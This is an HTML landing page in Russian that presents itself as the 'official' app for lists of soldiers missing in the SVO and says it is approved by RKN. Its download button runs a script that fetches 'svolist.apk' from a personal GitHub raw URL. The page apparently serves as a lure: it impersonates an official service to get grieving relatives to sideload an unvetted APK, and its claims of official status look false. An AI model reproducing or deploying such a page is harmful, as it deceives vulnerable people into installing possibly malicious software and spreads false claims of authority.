<!doctype html>

<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Списки пропавших СВО — Официальная загрузка</title>

  <style>
    :root{
      --bg: #eaf6ff;
      --card: #ffffff;
      --accent: #178ed6;
      --accent-2: #47a7e6;
      --muted: #6b7680;
      --shadow: 0 6px 20px rgba(23,142,214,0.12);
    }

    body{
      margin:0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
      background: linear-gradient(180deg,var(--bg), #f7fbff);
      color:#0f1720;
    }

    .header{
      width:100%;
      background:var(--accent);
      padding:14px;
      text-align:center;
      color:white;
      font-size:18px;
      font-weight:600;
      box-shadow:0 3px 10px rgba(0,0,0,0.14);
    }

    .wrap{
      display:flex;
      justify-content:center;
      padding:30px 22px;
    }

    .card{
      width:100%;
      max-width:420px;
      background:var(--card);
      border-radius:18px;
      padding:20px;
      box-shadow:var(--shadow);
      margin-top:20px;
    }

    .logo-row{
      display:flex;
      gap:12px;
      align-items:center;
    }

    .logo{
      width:56px;
      height:56px;
      border-radius:12px;
      background: linear-gradient(135deg,var(--accent), var(--accent-2));
      display:flex;
      align-items:center;
      justify-content:center;
      color:white;
      font-weight:700;
      font-size:20px;
      box-shadow: 0 6px 18px rgba(71,167,230,0.18);
    }

    h1{
      margin:0;
      font-size:18px;
    }

    .lead{
      margin:10px 0 16px 0;
      color:var(--muted);
      font-size:14px;
    }

    .info-row{
      margin-top:12px;
      display:flex;
      justify-content:space-between;
      gap:12px;
    }

    .file-meta{
      font-size:13px;
      color:var(--muted);
    }

    .badge{
      padding:7px 12px;
      background:rgba(23,142,214,0.06);
      border-radius:50px;
      border:1px solid rgba(23,142,214,0.1);
      font-size:13px;
      color:var(--accent);
      font-weight:500;
    }

    .download-btn{
      margin-top:20px;
      width:100%;
      padding:14px 16px;
      background: linear-gradient(90deg,var(--accent), var(--accent-2));
      color:white;
      border:none;
      border-radius:12px;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      box-shadow: 0 8px 28px rgba(23,142,214,0.18);
      transition:0.08s;
    }

    .download-btn:active{
      transform:scale(0.98);
    }

    .subnote{
      margin-top:10px;
      font-size:12px;
      color:var(--muted);
    }

    .footer{
      margin-top:40px;
      padding:18px;
      text-align:center;
      font-size:13px;
      color:var(--muted);
      border-top:1px solid rgba(0,0,0,0.08);
    }
  </style>

</head>
<body>

  <div class="header">
    Списки пропавших СВО — официальный ресурс
  </div>

  <div class="wrap">
    <section class="card">

```
  <div class="logo-row">
    <div class="logo">СП</div>
    <div>
      <h1>Списки пропавших СВО</h1>
      <p class="lead">Официальное приложение для просмотра списков пропавших. Нажмите «Скачать», чтобы загрузить APK файл.</p>
    </div>
  </div>

  <div class="info-row">
    <div class="file-meta">Файл: <strong>svolist.apk</strong></div>
    <div class="badge">Версия: 1.0</div>
  </div>

  <button id="downloadBtn" class="download-btn">⬇ Скачать</button>

  <div class="subnote">
    Размер: <strong>64,3 МБ</strong>
  </div>

</section>
```

  </div>

  <div class="footer">
    © 2025 Все права защищены.<br>
    Одобрено РКН.
  </div>

<script>
  const btn = document.getElementById("downloadBtn");
  btn.onclick = () => {
    // GitHub ссылка для скачивания APK
    const a = document.createElement("a");
    a.href = "https://raw.githubusercontent.com/franclasycs23/svolist-download/main/svolist.apk";
    a.download = "svolist.apk";
    document.body.appendChild(a);
    a.click();
    a.remove();
  };
</script>

</body>
</html>
